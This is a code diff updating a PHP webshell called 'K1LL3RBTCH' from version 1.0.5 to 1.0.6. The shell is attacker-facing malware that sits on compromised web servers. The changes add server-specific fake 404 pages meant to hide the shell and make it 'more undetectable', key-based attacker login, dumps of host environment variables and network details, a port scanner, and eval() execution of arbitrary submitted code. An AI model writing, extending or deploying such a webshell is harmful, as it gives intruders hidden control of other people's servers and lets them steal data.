@@ -42,7 +42,7 @@ SOFTWARE.
 #                                                                               #
 #################################################################################
 # K1LL3RBTCH webshell by It0sh1                                                 #
-# @Version: 1.0.5.                                                              #
+# @Version: 1.0.6.                                                              #
 # github: https://github.com/it0sh1/                                            #
 #################################################################################
 session_start(); // start session
@@ -57,14 +57,6 @@ $switch = array('home', 'securityinformation', 'commandline', 'portscan', 'scrip
 class Loginsystem
 {
 
-  public static function error404page()
-  {
-    if(header('HTTP/1.x 404 Not Found'))
-    {
-      echo "Test";
-    }
-  }
-
   // we need to hide ourselfs, so lets make that first.
   public static function hideyourass()
   {
@@ -76,14 +68,35 @@ class Loginsystem
     // making function for '404' message.
     function message404()
     {
-      // set header
-      header('HTTP/1.x 404 Not Found');
 
-      // print 404 message
-      print("<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'><html><head><title>404 Not Found</title></head><body>");
-      print("<h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr>");
-      print("<address>".$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['HTTP_HOST']." Port ".$_SERVER['SERVER_PORT']."</address></body></html>");
-      exit; // exit script
+      // now we gonna check which webserver software the server uses.
+      // make it more realistic and more undetectable.
+
+      // checking for apache2
+      if(strpos($_SERVER['SERVER_SOFTWARE'], 'apache') !== false)
+      {
+        // set header
+        header('HTTP/1.x 404 Not Found');
+
+        // print 404 message
+        print("<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'><html><head><title>404 Not Found</title></head><body>");
+        print("<h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr>");
+        print("<address>".$_SERVER['SERVER_SOFTWARE']." Server at ".$_SERVER['HTTP_HOST']." Port ".$_SERVER['SERVER_PORT']."</address></body></html>");
+        exit; // exit script
+      }
+
+      // checking for Nginx
+      if(strpos($_SERVER['SERVER_SOFTWARE'], 'nginx') !== false)
+      {
+        // set header
+        header('HTTP/1.x 404 Not Found');
+
+        // print 404 message
+        print("<html><head><title>404 Not Found</title></head><body>");
+        print("<center><h1>404 Not Found</h1></center>");
+        print("<hr><center>".$_SERVER['SERVER_SOFTWARE']." (".ucwords(php_uname('n')).")</center></body></html>");
+        exit; // exit script
+      }
     }
 
     // lets block all the services and browsers in the doom list.
@@ -146,10 +159,13 @@ class Loginsystem
       // if access key is equal to $_POST['key']
       } elseif(isset($_POST['key']) AND $_POST['key'] === $access_key)
       {
-        // set login session to true:
-        $_SESSION[uniqid()] = true;
+        // generate a new session id (prevents session hijacking etc etc.)
+        session_regenerate_id(TRUE); // set to true
+
+        // $_SESSION['attackersession'] will become true bc $_POST['key'] is equal to $access_key
         $_SESSION['attackersession'] = true;
-        // redirect to login page
+
+        // redirect to the admin panel
         header('Location: '.$_SERVER['PHP_SELF'].'?');
       }
     }
@@ -237,12 +253,55 @@ class Loginsystem
       print("<center style='float: right;'>");
       print("<b style='float: right;'>".self::img()."</b></center>");
       print("<b style='color: #B22222; font-size: 13px;'>System: </b>".PHP_UNAME()."<br>");
-      print("<b style='color: #B22222; font-sise: 13px;'>Server Software: </b>".$_SERVER['SERVER_SOFTWARE']."<br>");
-      print("<b style='color: #B22222; font-size: 13px;'>Host address: </b>".getenv('HTTP_HOST')."<br>");
+      print("<b style='color: #B22222; font-size: 13px;'>Server software: </b>".$_SERVER['SERVER_SOFTWARE']."<br>");
+
+      // creating ipv4/ipv6 check
+      function ipversioncheck()
+      {
+        $host = getenv('HTTP_HOST');
+
+        // ipv6 based
+        if(!FILTER_VAR($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) === false)
+        {
+          // print info
+          print("<b style='color: #B22222; font-size: 13px;'>Host address: </b>".$host."<b>[</b><b style='color: blue;'>Ipv6 Address</b><b>]</b><br>");
+        }
+
+        // ipv4 based
+        if(!FILTER_VAR($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) === false)
+        {
+          // print info
+          print("<b style='color: #B22222; font-size: 13px;'>Host address: </b>".$host." <b>[</b><b style='color: blue;'>Ipv4 Address</b><b>]</b><br>");
+        }
+      }
+
+      // declare function
+      ipversioncheck();
+
+      // go further
       print("<b style='color: #B22222; font-size: 13px;'>Server Port: </b>".$_SERVER['SERVER_PORT']."<br>");
       print("<b style='color: #B22222; font-size: 13px;'>Protocol: </b>".$_SERVER['SERVER_PROTOCOL']."<br>");
       print("<b style='color: #B22222; font-size: 13px;'>php.ini conf: </b>".php_ini_loaded_file()."<br>");
-      print("<b style='color: #B22222; font-size: 13px;'>Apache2 files: </b>".implode(' ,', getenv())."<br>");
+      // create function for show server info
+      function servinfo()
+      {
+        // apache2 based
+        if(strpos($_SERVER['SERVER_SOFTWARE'], 'apache') !== false)
+        {
+          print("<b style='color: #B22222; font-size: 13px;'>Apache2 files: </b>".implode(' ,', getenv())."<br>");
+        }
+
+        // nginx based
+        if(strpos($_SERVER['SERVER_SOFTWARE'], 'nginx') !== false)
+        {
+          print("<b style='color: #B22222; font-size: 13px;'>Nginx Info: </b>".implode(' ,', getenv())."<br>");
+        }
+      }
+
+      // declare func
+      servinfo();
+
+      // go further
       print("<b style='color: #B22222; font-size: 13px;'>Root directory: </b>".$_SERVER['DOCUMENT_ROOT']."<br>");
       print("<b style='color: #B22222; font-size: 13px;'>CWD: </b>".getcwd()."<br></center><hr>");
 
@@ -451,7 +510,7 @@ class shellfunctions
 
       // Show manager
       print("<table style='width: 100%; color: red;background-color: #141617; font-size: 13px; a:hover { background-color: white; }'>");
-      print("<tr><td style='color: #8B0000;'>Name</td><td style='color: #8B0000;'>Size</td><td style='color: #8B0000;'>Modified</td><td style='color: #8B0000;'>Permissions</td><td style='color: #8B0000;'>Owner/group</td><td style='color: #8B0000;'>Actions</td></tr>");
+      print("<tr><td style='color: #8B0000;'>Name</td><td style='color: #8B0000;'>Size</td><td style='color: #8B0000;'>Modified</td><td style='color: #8B0000;'>Permissions</td><td style='color: #8B0000;'>Actions</td></tr>");
 
       // when empty
       if(empty($_POST['searchfordir']))
@@ -467,7 +526,6 @@ class shellfunctions
       			print("<td><a name='test' href='?d=".$dir.'/'.$sdir."' style='text-decoration: none; color:#719CAA;'><b style='font-size: 19px;'>&#128193;</b>\n".htmlspecialchars($sdir)."</a><br></td>");
       			print("<td style='color: #B22222;'>".SizeFormat(filesize($dir.'/'.$sdir))."</td>");
       			print("<td style='color: #B22222;'>".date ("F d Y H:i:s.", filemtime($dir.'/'.$sdir))."</td>");
-            print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
             print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
       			print("<td>");
       			print("<a href='?renamedirectory=".$dir."' title='RENAME' style='text-decoration: none;'>&#128394;</a>&nbsp;&nbsp;");
@@ -495,7 +553,6 @@ class shellfunctions
       			print("<td><a href='?file=".$dir.'/'.$sdir."'><b style='font-size: 19px;'>&#128196;</b>\n".htmlspecialchars($sdir)."</a><br></td>");
       			print("<td style='color: #B22222;'>".SizeFormat(filesize($dir.'/'.$sdir))."</td>");
       			print("<td style='color: #B22222;'>".date ("F d Y H:i:s.", filemtime($dir.'/'.$sdir))."</td>");
-            print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
             print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
       			print("<td>");
       			print("<a href='?file=".$dir.'/'.$sdir."&rename=true' title='RENAME'>&#128394;</a>&nbsp;&nbsp;");
@@ -719,7 +776,6 @@ class shellfunctions
       				print("<td style='color: #B22222;'>".SizeFormat(filesize($dir.'/'.$sdir))."</td>");
       				print("<td style='color: #B22222;'>".date ("F d Y H:i:s.", filemtime($dir.'/'.$sdir))."</td>");
               print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
-              print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
       				print("<td>");
       				print("<a href='' title='RENAME' style='text-decoration: none;'>&#128394;</a>&nbsp;&nbsp;");
       				print("<a href='' title='DOWNLOAD'>&#x1F4E5;</a>&nbsp;&nbsp;");
@@ -745,7 +801,6 @@ class shellfunctions
       				print("<td><a href='?file=".$dir.'/'.$sdir."'><b style='font-size: 19px;'>&#128196;</b>\n".htmlspecialchars($sdir)."</a><br></td>");
       				print("<td style='color: #B22222;'>".SizeFormat(filesize($dir.'/'.$sdir))."</td>");
       				print("<td style='color: #B22222;'>".date ("F d Y H:i:s.", filemtime($dir.'/'.$sdir))."</td>");
-              print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
               print("<td style='color: #B22222;'>".fileperms($dir.'/'.$sdir)."</td>");
       				print("<td>");
       				print("<a href='' title='RENAME' style='text-decoration: none;'>&#128394;</a>&nbsp;&nbsp;");
@@ -803,8 +858,24 @@ class shellfunctions
       print("<b style='color: #B22222; font-size: 14px;'>PHP modules(Disabled): </b>");
       print(print_r(explode(',', ini_get('disable_functions'))) . "<br><br>");
       print("<b style='color: #B22222; font-size: 14px;'>PHP modules(Enabled): </b>".implode(', ', get_loaded_extensions())."<br><br>");
-      print("<b style='color: #B22222; font-size: 14px;'>Apache2 modules: </b>".implode(' ,', apache_get_modules())."<br><br>");
-      print("<b style='color: #B22222; font-size: 14px;'>Apache2 Files: </b>".implode(' ,', getenv())."<br><br>");
+      #print("<b style='color: #B22222; font-size: 14px;'>Apache2 modules: </b>".implode(' ,', apache_get_modules())."<br><br>");
+
+      // create function check
+      function getenvv()
+      {
+        if(strpos($_SERVER['SERVER_SOFTWARE'], 'apache') !== false)
+        {
+          print("<b style='color: #B22222; font-size: 14px;'>Apache2 Files: </b>".implode(' ,', getenv())."<br><br>");
+        }
+
+        if(strpos($_SERVER['SERVER_SOFTWARE'], 'nginx') !== false)
+        {
+          print("<b style='color: #B22222; font-size: 14px;'>Nginx Info: </b>".implode(' ,', getenv())."<br><br>");
+        }
+      }
+
+      // declare getenv()
+      getenvv();
 
       // check for curl support
       function curl_check()
@@ -958,8 +1029,66 @@ class shellfunctions
       system_config();
 
       // go further
-      print("<b style='color: #B22222; font-size: 14px;'>Host: </b>".$_SERVER['SERVER_NAME']."<br>");
-      print("<b style='color: #B22222; font-size: 14px;'>Server port: </b>".$_SERVER['SERVER_PORT']."<br><br>");
+      print("<b style='color: #B22222; font-size: 14px;'>Server Name: </b>".$_SERVER['SERVER_NAME']."<br>");
+
+      // create check for valid ipv4 or ipv4 remote address funtion
+      function ipv4oripv6remoteaddress()
+      {
+        // create variable
+        $remote_server_address = $_SERVER['REMOTE_ADDR'];
+
+        // check for ipv6
+        if(!filter_var($remote_server_address, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) === false)
+        {
+          // create variable
+          $echo_remote_server_address = "<b style='color: #B22222; font-size: 14px;'>Remote Address: </b>".$_SERVER['REMOTE_ADDR']."<b> [</b><b style='color: blue;'>IPV6 Address</b><b>]</b><br>";
+          // print variable
+          echo $echo_remote_server_address;
+        }
+
+        // check for ipv4
+        if(!filter_var($remote_server_address, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) === false)
+        {
+          // create variable
+          $echo_remote_server_address = "<b style='color: #B22222; font-size: 14px;'>Remote Address: </b>".$_SERVER['SERVER_ADDR']."<b> [</b><b style='color: blue;'>IPV4 Address</b><b>]</b><br>";
+          // print variable
+          echo $echo_remote_server_address;
+        }
+      }
+
+      // declare remote address type
+      ipv4oripv6remoteaddress();
+
+      // create check for valid ipv4 or ipv6 port function
+      function ipv4oripv6serveraddress()
+      {
+        // create variable
+        $server_address = $_SERVER['SERVER_ADDR'];
+
+        // check if server addr runs on ipv6
+        if(!filter_var($server_address, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) === false)
+        {
+          // show the needed info
+          $echo_server_address = "<b style='color: #B22222; font-size: 14px;'>Server Address: </b>".$_SERVER['SERVER_ADDR']."<b style='color: blue;'> [</b><b>IPV6 Address</b><b>]</b><br>";
+          // print variable
+          echo $echo_server_address;
+        }
+
+        // check if server addr runs on ipv4
+        if(!filter_var($server_address, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) === false)
+        {
+          // show needed information
+          $echo_server_address = "<b style='color: #B22222; font-size: 14px;'>Server Address: </b>".$_SERVER['SERVER_ADDR']."<b> [</b><b style='color: blue;'>IPV4 Address</b><b>]</b><br>";
+          // print variable
+          echo $echo_server_address;
+        }
+      }
+
+      // declare port check
+      ipv4oripv6serveraddress();
+
+      // print port
+      print("<b style='color: #B22222; font-size: 14px;'>Server Port: </b>".$_SERVER['SERVER_PORT']."<br><br>");
 
       // writing function for showing internal network on the infected webserver
       function show_internal_network()
@@ -1279,6 +1408,19 @@ class shellfunctions
     // import switch array
     global $switch;
 
+    // error message function
+    function errormsg(string $error)
+    {
+      print('<div class="error-message"><span class="error-text"><b>Error:</b> '.$error.'</span></div>');
+      exit; // EXIT
+    }
+
+    // succeed message function
+    function successmessage(string $succeed)
+    {
+      print('<div class="success-message"><span class="succeed-text"><b>msg: </b>'.$succeed.'</span></div>');
+    }
+
     // when $_GET['q'] is set:
     if(isset($_GET['q']) AND $_GET['q'] === $switch[3])
     {
@@ -1309,7 +1451,7 @@ class shellfunctions
 
       // CSS for errormessages
       print("<style> input:focus { outline: none !important; border-color: #8B0000; box-shadow: 0 0 10px #8B0000; } textarea:focus { outline: none !important; border-color: #8B0000; box-shadow: 0 0 10px #8B0000; }.error-message { background-color: #fce4e4; border: 2px solid #fcc2c3; width: 170px; padding: 5px 30px; border-radius: 3px; } .error-text { color: #cc0033; font-family: Helvetica, Arial, sans-serif; font-size: 13px;font-weight: bold;line-height: 20px;text-shadow: 1px 1px rgba(250,250,250,.3);}");
-      print(".succeed-message { background-color: #ecffd6; border: 2px solid #617c42; width: 170px; padding: 5px 30px; border-radius: 3px; } .succeed-text { color: #2b7515; font-family: Helvetica, Arial, sans-serif; font-size: 13px; font-weight: bold; line-height: 20px; text-shadow: 1px 1px rgba(250,250,250,.3);}</style>");
+      print(".success-message { background-color: #ecffd6; border: 2px solid #617c42; width: 170px; padding: 5px 30px; border-radius: 3px; } .succeed-text { color: #2b7515; font-family: Helvetica, Arial, sans-serif; font-size: 13px; font-weight: bold; line-height: 20px; text-shadow: 1px 1px rgba(250,250,250,.3);}</style>");
 
       function PortScanner()
       {
@@ -1326,7 +1468,7 @@ class shellfunctions
           if(function_exists('socket_create'))
           {
             // create socket
-            $socketconn = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+            $socketconn = @socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
             for($socketport=$sport;$socketport<=$eport; $socketport++)
             {
               // create connection
@@ -1336,14 +1478,16 @@ class shellfunctions
               {
                 // create list of showing ports
                 // end PHP TAG ?>
-                <tr><td>Port:</td>
-                <td><?php echo $socketport; ?></td>
-                <td style='color: green;'>OPEN &#9989;</td>
-
+                <tr>
+                  <td>Port:</td>
+                  <td><?php echo "<a href='http://".$_SERVER['SERVER_ADDR'].":".$socketport."' style='color: blue; text-decoration: none;' target='_blank'><b>".$socketport."</b></a>"; ?></td>
+                  <td style='color: green;'>OPEN &#9989;</td>
                 </tr>
                 <?php // OPEN PHP TAG
+
                 // close socket
                 socket_close($socketconn);
+                // create socket again.
                 $socketconn = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
               }
             }
@@ -1363,10 +1507,10 @@ class shellfunctions
                 // create list of showing ports
                 // end PHP TAG ?>
                 <tr><td>Port:</td>
-                <td><?php echo $socketport; ?></td>
+                <td><?php echo "<a href='http://".$_SERVER['SERVER_ADDR'].":".$socketport."'>".$socketport."</a>"; ?></td>
                 <td style='color: green;'>OPEN &#9989;</td>
 
-                </tr>
+              </tr>
                 <?php // OPEN PHP TAG
 
                 // close connection
@@ -1374,9 +1518,10 @@ class shellfunctions
               }
             }
           }
-        }
 
-        exit; // EXIT
+          // EXIT SCRIPT
+          exit; // EXIT
+        }
       }
 
       // declare portscanner
@@ -1443,21 +1588,8 @@ class shellfunctions
               eval($_SESSION['code']);
 
               // when you wanna end
-              echo "<br><br><hr><center><form method='POST' action=''><button type='submit' name='deletesession' style='text-decoration: none; border: 2px solid #333; background-color: grey;'><code style='font-size: 15px; color: #8B0000;'>Stop script</code></button></form></center>";
-
-              // When we press stop script button
-              if(isset($_POST['deletesession']))
-              {
-                // delete session
-                session_unset($_SESSION['code']);
-                // destroy session
-                session_destroy($_SESSION['code']);
-
-                // locate to the script page
-                header('Location: '.$_SERVER['PHP_SELF'].'?q='.$switch[4].'');
-                // stop and exit script
-                exit; // EXIT
-              }
+              echo "<br><br><hr><center><a href='' style=''>Stop script</a></center>";
+              exit; // EXIT
             }
           }
         }
